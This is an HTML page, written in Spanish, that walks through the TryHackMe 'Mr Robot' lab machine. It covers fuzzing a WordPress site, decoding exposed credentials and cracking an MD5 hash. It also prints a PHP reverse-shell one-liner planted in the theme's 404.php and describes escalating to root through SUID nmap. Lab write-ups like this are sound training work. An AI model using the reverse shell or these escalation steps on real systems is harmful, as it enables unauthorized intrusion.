@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="es">
+   <head>
+      <meta charset="UTF-8">
+      <link rel="stylesheet" href=../css/general.css>
+      <title>Mr robot</title>
+   </head>
+   <body>
+   	<h2>Mr Robot</h2>
+   	<div>
+			<div>
+				<img src="../imagenes/mrRobot/mrRobot.png" alt="Mr robot">
+			</div>
+
+			<section>
+				<nav>
+					<p>
+						Esta màquina es de dificultad media, se ubica en TryHackme y en primera instancia cabe recalcar qye cuenta con una web disponible la cual tiene soporte en <b>Wordpress</b>, ademàs cabe destacar que en esta web tiene expuesto varios archivos los cuales se detectan realizando fuzzeo y tambièn se cuenta con una que expone credenciales de acceso al panel administrativo a <b>Wordpress</b>, posterior a ello se tiene capacidad de escalamiento gracias a que se cuenta con credenciales cifradas de un modo no muy seguro, asimismo se tiene <b>nmap</b> con permisos <b>SUID</b> en una version vulnerable 
+					</p>
+					<p>
+						 Para comenzar, es necesario encender la maquina en la plataforma TryHakme y tener el archivo *.openvpn en nuestro dispositivo 
+					</p>
+					<p>
+						Iniciamos verificando la conecciòn de la màquina remota con la nuestra, realizando simplemente un pineo, de modo que hacemos una solicitud y alavèz revisamos el <b>ttl</b>
+					</p>
+				</nav>
+				<img src="../imagenes/mrRobot/pineo.png" alt="Pineo">
+				<div>
+					<nav>
+						<p>
+							Al ya haber revisado la conecciòn, procedemos haciendo un escaneo general de los 65535 puertos con <b>nmap</b>, llegando a verificar solon puertos abiertos, los cuales redireccionan a la misma web, solo que una con protocolo <i>HTTP</i> y la otra con <i>HTTPS</i>
+						</p>
+					</nav>
+					<img src="../imagenes/mrRobot/scanNmap.png" alt="Escaneo nmap">
+					 <nav>
+                  <p>
+                  	Procedemos a revisar el contenido de la web que dispone este servidor, verificandose asi que se cuenta con una serie de comandos que nos indica y cada uno de estos hace referenca a la serie que lleva el mismo nombre <b>Mr Robot</b>
+                  </p>
+               </nav>
+					<img src="../imagenes/mrRobot/webContent.png" alt="Contenido web">
+					<nav>
+						<p>
+							Al ya contar con una web y no poder acceder ni nada desde los comandos que se dispone ni ver alguna pista en el codigo base de esa web, he procedido a realizar Fuzzeo con <b>ffuf</b>, llegando a encontrar multiple contenido, del cual he revisado uno por uno
+						</p>
+					</nav>
+               <img src="../imagenes/mrRobot/fuzzing.png" alt="Fuzzeo">
+					<nav>
+						<p>
+							Al reviar los contenidos que me va mostrando el fuzzeo he procedido a acceder a login, el cual me ha redireccionado al siguiente panel de acceso que corresponde a <b>Wordpress</b>
+						</p>
+					</nav>
+					<img src="../imagenes/mrRobot/formLogin.png" alt="Logeo">
+               <nav>
+						<p>
+							Es importante destacar que el fuzzeo al parecer el diccionario que he empleado no contenia <i>robots.txt</i> archivo que contiene un diccionario y la primera flag, sin embargo cabe destacar que no ha sido muy alarmante para mi ello ya que he encontrado el usuario y contraseña en otro contenido que me ha mostrado <b>ffuf</b>, sin embargo esta esta encryptado en <b>base64</b>
+						</p>
+               </nav>
+					<img src="../imagenes/mrRobot/robots.png" alt="Robots txt">
+					<img src="../imagenes/mrRobot/credenciales.png" alt="Contraseña encryptada">
+               <nav>
+						<p>
+							Procedemos a desencryptar esta contraseña que se encuentra en <b>base64</b> tratandola desde nuestra misma terminal, en este caso yo la he guardado en un archivo para tenerla como evidencia y he procedido a desencryptarla tal como se aprecua
+						</p>
+               </nav>
+               <img src="../imagenes/mrRobot/logeo.png" alt="Credenciales de logeo">
+					<nav>
+						<p>
+							Como mencione anteriormente en el archivo <b>robots.txt</b> se encuentra una de las flags, la cual si no se verificaria asi se pudiese verificar esta cuando se gane acceso al sistema							
+						</p>
+					</nav>
+					<img src="../imagenes/mrRobot/flag1.png" alt="Primera flag">
+					<nav>
+						<p>
+							Ya en este punto tenemos la primera flag, asimismo hemos encontrado las credenciales de acceso al panel administrativo de <b>Wordpress</b>, teniendo la siguiente captura
+						</p>
+					</nav>
+					<img src="../imagenes/mrRobot/panelWord.png" alt="Panel wordpress">
+					<nav>
+						<p>
+							Al ya tener acceso primeramentre me he dirigido al editor de apariencias, donde tengo una lista de archivos, tanto <i>*.php, *.js y *.css</i>
+						</p>
+					</nav>
+					<img src="../imagenes/mrRobot/base.png" alt="Base php">					
+					<nav>
+						<p>
+							Para interactuar de manera directa con el contenido que esta en <b>php</b>, he decidido editar <i>404.php</i> el cual tiene codigo para mostrar cuando se genere un error en la solicitud a la <i>IP</i>, cambiando el contenido original por una shell reversa con la cual gane acceso desde mi màquina
+						</p>
+					</nav>
+               <div class="codigo-container">
+               	<div class="btn_cp">
+               		<a class="formB" onclick="copiarCodigo(this)"> < / ></a>
+						</div>
+							 <pre class="codigo">
+
+&lt?php
+	echo exec("/bin/bash -c 'bash -i >& /dev/tcp/&ltIP&gt/&ltPORT&gt 0>&1' 2>/dev/null")
+?&gt
+							 </pre>
+					</div><br>
+					<img src="../imagenes/mrRobot/reverseShell.png" alt="Shell reversa">
+					<nav>
+						<p>
+							Ya habiendo guardado mi shell reversa, al acceder mediante la <i>IP</i> a un recurso no valido me devuelve una conecciòn a mi màquina, la cual estaba en escucha en el puerto especificado, teniendo asi mi primera conecciòn con el servidor.
+						</p>
+					</nav>
+					<img src="../imagenes/mrRobot/coneccion.png" alt="Primera conecciòn">
+					<nav>
+						<p>
+							Ya en la màquina destino he procedido a listar los usuarios de la misma, haciendo referencia a <i>/etc/passwd</i>, en el cual se tiene al usuario <b>robot</b>
+						</p>
+					</nav>
+					<img src="../imagenes/mrRobot/listUsers.png" alt="Listando usuarios">
+					<nav>
+						<p>
+							Al dirigirme al contenido del usuario <b>robot</b> en <i>/home/robot</i> he llegado donde esta la segunda flag sin embargo el usuario actual que es <b>deamon</b> no puede interactuar con ello, sin embargo se puede apreciar una password que indica puede estar encryptada con <b>MD5</b>, mostrandose asi el contenido de la misma y asumiendo asi que se trata de las credenciales del usuario <b>robot</b> 
+						</p>
+					</nav>
+					<img src="../imagenes/mrRobot/baseRobot.png" alt="Listado de contenido de robot">
+					<nav>
+						<p>
+							Para tratar de desencryptar la contraseña que hemos encontrado en MD5 he procedido a usar <a style="text-decoration:none";  href="https://crackstation.net/" target="_blank">CrackStation</a> con lo que he conseguido obtener las credenciales del usuario <b>robot</b>
+						</p>
+					</nav>
+					<img src="../imagenes/mrRobot/robotPass.png" alt="Contraseña de robot">
+					<nav>
+						<p>
+							Es importante mencionar que ha pesar que he logrado la conecciòn con <b>rlwrap</b> que es una consola màs interactiva, el tratar de acceder con <b>su robot</b> siempre me salia un error en el proceso indicando que la consola no lo soportaba, motivo por el que he optado por hacer tratamiento de esta, primeramente exportando la terminal a una <b>linux</b> despues cambiandome a una bash con <b>python</b> y logrando asi aceptar el comando anterior y llegar a establecer conecciòn como el usuario <b>robot</b>
+						</p>
+					</nav>
+               <div class="codigo-container">
+                  <div class="btn_cp">
+                     <a class="formB" onclick="copiarCodigo(this)"> < / ></a>
+                  </div>
+                      <pre class="codigo">
+
+export TERM=linux
+python -c "import pty; pty.spawn('/bin/bash')"
+                      </pre>
+               </div><br>
+					<img src="../imagenes/mrRobot/acces.png" alt="Acceso a robot">
+					<nav>
+						<p style="text-align:center;">
+							De este modo ya teniendo acceso a la segunda flag que encontramos anteriormente
+						</p>
+					</nav>
+					<img src="../imagenes/mrRobot/flag2.png" alt="Segunda flag">
+					<nav>
+						<p>
+							Ya en este punto he optado por listar el contenido con permisos SUID, para verificar si aqui haye algo que se pueda aprovechar y con lo cual escalar privilegios a <b>root</b> con lo que ya pueda encontrar la ùltima flag
+						</p>
+					</nav>
+					<img src="../imagenes/mrRobot/suid.png" alt="Bùscando SUID">
+					<nav>
+						<p>
+							Verificando el contenido listado con permisos SUID se puede apreciar que se tiene a <b>nmap</b> como un servicio que corre aqui, por lo cual he bùscado en la web alguna manera de escalar privilegios con ellos y he llegado a dar con la web de <a style="text-decoration:none;" href="https://gtfobins.github.io/" target="_blank">gtfobins</a> la cual nos muestra una manera sencilla de hacerlo, <i>Sin usar el <b>sudo</b></i>
+						</p>
+					</nav>
+					<img src="../imagenes/mrRobot/GTOF.png" alt="Escalada GTFOBins">
+					<nav>
+						<p style="text-align:center">
+							Llegando de este modod a escalar privilegios y ser root de manera sencilla 
+						</p>
+					</nav>
+					<img src="../imagenes/mrRobot/escalada.png" alt="Escalada a root">
+					<nav>
+						<p>
+							Ya teniendo los màximos privilegios es cuestiòn de dirigirse a <i>/root</i> donde se ùbica la ùltima flag, llegando a finalizar de esta manera la sala de <b>Mr robot</b>
+						</p>
+					</nav>
+					<img src="../imagenes/mrRobot/flag3.png" alt="Tercera flag">
+				</div>
+				
+			</section>
+					
+   	</div>
+   </body>
+   <hr>
+   <footer>
+      <div>
+         Jcarlos
+      </div>
+      <div>
+         <a href="https://rb.gy/d2u7jy" target="_blank" > Linkeding </a>
+      </div>
+   </footer>
+	<script src="../js/global.js"></script>
+</html>
